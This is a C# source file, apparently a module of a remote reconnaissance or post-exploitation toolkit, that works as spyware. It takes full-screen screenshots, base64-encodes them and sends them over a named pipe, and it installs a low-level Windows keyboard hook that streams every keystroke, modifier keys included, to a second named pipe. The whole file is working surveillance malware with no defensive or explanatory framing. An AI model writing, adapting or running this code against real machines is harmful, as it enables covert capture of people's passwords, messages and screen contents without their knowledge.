using System;
using System.IO;
using System.IO.Pipes;
using System.Windows.Forms;
using System.Drawing;
using System.Drawing.Imaging;
using System.Threading;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text;

namespace RemoteReconKS
{
    public class RemoteReconKS
    {

        private static NamedPipeServerStream server;
        private static NamedPipeClientStream client;
        private static byte[] key;
        private static StreamWriter sw;
        private static StringBuilder keylogoutput = new StringBuilder();

        public static void Execute(string capability)
        {
            if (capability.ToLower() == "screenshot")
            {
                server = new NamedPipeServerStream("svc_ss", PipeDirection.InOut, 1, PipeTransmissionMode.Message);
                server.WaitForConnection();
                sw = new StreamWriter(server);

                //byte[] image = screenshot();
                sw.WriteLine(screenshot());
                Thread.Sleep(5000);
                sw.Flush();

                server.Close();
            }
            else if(capability.ToLower() == "keylog")
            {
                StartKeylogger();
            }
        }

        private static string screenshot()
        {

            try
            {
                string encImage;
                var screenshotobject = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
                var DrawingGraphics = Graphics.FromImage(screenshotobject);

                DrawingGraphics.CopyFromScreen(Screen.PrimaryScreen.Bounds.X, Screen.PrimaryScreen.Bounds.Y, 0, 0, screenshotobject.Size, CopyPixelOperation.SourceCopy);
                DrawingGraphics.Dispose();

                MemoryStream ms = new MemoryStream();
                screenshotobject.Save(ms, ImageFormat.Png);
                byte[] imgBytes = ms.ToArray();
                encImage = Convert.ToBase64String(imgBytes);
                return encImage;
            }
            catch (Exception e)
            {
                return e.ToString();
            }
        }

        private static void StartKeylogger()
        {
            //Start a background thread for the keylogger
            WinApi._hookID = SetHook(WinApi._proc);
            /*Thread t = new Thread(() =>
            {
                LogKeyStrokes();
            });
            t.IsBackground = true;
            t.Start();*/
            try
            {
                client = new NamedPipeClientStream(".", "svc_kl", PipeDirection.Out);
                client.Connect(5000);
                Application.Run();
                WinApi.UnhookWindowsHookEx(WinApi._hookID);
                Application.ExitThread();
            }
            catch (Exception e)
            {
#if DEBUG
                File.AppendAllText("C:\\Users\\dso\\Desktop\\Keylogger.log", e.ToString());
#endif
            }
            
        }

        /*
        private static void LogKeyStrokes()
        {
            NamedPipeClientStream client = new NamedPipeClientStream(".","svc_kl", PipeDirection.InOut);
            client.Connect(5000);
            //sw = new StreamWriter(client);
            while (client.IsConnected)
            {
                try
                {
                    byte[] klBytes = Encoding.ASCII.GetBytes(keylogoutput.ToString());
                    client.Write(klBytes, 0, klBytes.Length);
#if DEBUG
                    File.AppendAllText("C:\\Users\\dso\\Desktop\\keylog.log", keylogoutput.ToString() + "\r\n");
#endif
                    keylogoutput.Remove(0, keylogoutput.Length);
                }
                catch (Exception e)
                {
#if DEBUG
                    File.AppendAllText("C:\\Users\\dso\\Desktop\\keylog.log", e.ToString() + "\r\n");
#endif
                }
                
                
                Thread.Sleep(1000);
                client.Flush();
            }
            sw.Close();
            client.Close();
            client.Dispose();
        }*/

        //Keyboard hook
        private static IntPtr SetHook(WinApi.LowLevelKeyboardProc proc)
        {
            using (Process curProcess = Process.GetCurrentProcess())
            {
                using (ProcessModule curModule = curProcess.MainModule)
                {
                    return WinApi.SetWindowsHookEx(WinApi.WH_KEYBOARD_LL, proc, WinApi.GetModuleHandle(curModule.ModuleName), 0);
                }
            }
        }

        public static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            byte[] keyboardState = new byte[256];
            StringBuilder modKey = new StringBuilder();
            IntPtr kblh = WinApi.GetKeyboardLayout(Process.GetCurrentProcess().Id);

            if (nCode >= 0 && (wParam == (IntPtr)WinApi.WM_KEYDOWN || wParam == (IntPtr)WinApi.WM_SYSKEYDOWN))
            {
                int vkCode = Marshal.ReadInt32(lParam);
                //Catch modifier keys and append a string representation.
                switch ((Keys)vkCode)
                {
                    case Keys.Space:
                        key = Encoding.UTF8.GetBytes(" ");
                        client.Write(key, 0, key.Length);
                        //client.Flush();
                        break;
                    case Keys.RControlKey:
                        key = Encoding.UTF8.GetBytes("[RCNTRL]");
                        client.Write(key, 0, key.Length);
                        //client.Flush();
                        break;
                    case Keys.LControlKey:
                        key = Encoding.UTF8.GetBytes("[LCNTRL]");
                        client.Write(key, 0, key.Length);
                        //client.Flush();
                        break;
                    case Keys.LWin:
                        key = Encoding.UTF8.GetBytes("[WIN]");
                        client.Write(key, 0, key.Length);
                        //client.Flush();
                        break;
                    case Keys.Tab:
                        key = Encoding.UTF8.GetBytes("[TAB]");
                        client.Write(key, 0, key.Length);
                        //client.Flush();
                        break;
                    case Keys.Back:
                        key = Encoding.UTF8.GetBytes("[BACKSPACE]");
                        client.Write(key, 0, key.Length);
                        //client.Flush();
                        break;
                    default:
                        break;
                }

                
                //Check if the shift modifier was used
                bool shiftMod = Convert.ToBoolean((int)WinApi.GetAsyncKeyState(Keys.ShiftKey) & 32768);
                var scancode = WinApi.MapVirtualKeyEx((uint)vkCode, 0x04, kblh);

                if (scancode > 0)
                {

                    if (shiftMod)
                    {
                        keyboardState[(int)Keys.ShiftKey] = 0x80;
                        keyboardState[(int)Keys.LShiftKey] = 0x80;
                        keyboardState[(int)Keys.RShiftKey] = 0x80;
                    }

                    var s = new StringBuilder(256);
                    var returnCode = WinApi.ToUnicodeEx((uint)vkCode, scancode, keyboardState, s, s.Capacity, 0, kblh);
                    //keylogoutput.Append(s.ToString());
                    if (client.IsConnected)
                    {
                        key = Encoding.UTF8.GetBytes(s.ToString());
                        client.Write(key, 0, key.Length);
                        client.Flush();
                    }
                    else
                    {
                        Application.ExitThread();
                    }

                }
                else
                {
                    var s = new StringBuilder(5);
                    var returnCode = WinApi.ToUnicodeEx((uint)vkCode, scancode, keyboardState, s, s.Capacity, 0, kblh);
                }
            }

            
            return WinApi.CallNextHookEx(WinApi._hookID, nCode, wParam, lParam);
        }

    }
}
